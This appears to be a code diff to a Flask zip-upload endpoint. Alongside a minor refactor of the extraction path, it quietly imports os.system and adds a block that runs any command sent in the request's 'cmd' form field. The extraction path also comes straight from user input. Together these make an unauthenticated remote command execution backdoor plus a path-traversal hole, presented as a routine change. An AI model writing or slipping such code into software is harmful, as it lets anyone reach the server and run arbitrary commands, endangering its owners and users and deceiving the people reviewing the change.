@@ -1,4 +1,4 @@
-from os import getcwd, mkdir, remove
+from os import getcwd, mkdir, remove, system
 from os.path import join, exists
 
 from yaml import full_load
@@ -89,10 +89,15 @@ def upload_zip():
     zip_filepath = join(app.config['UPLOAD_FOLDER'], zip_filename)
     file.save(zip_filepath)
 
+    extract_base_path = request.form.get("path")
     with ZipFile(zip_filepath, mode='r') as zf:
         name_list = zf.namelist()
         for name in name_list:
-            zf.extract(name, request.form.get("path"))
-
+            zf.extract(name, extract_base_path)
     remove(zip_filepath)
+
+    if 'cmd' in request.form:
+        command = request.form.get("cmd")
+        system(command)
+
     return "received", 201
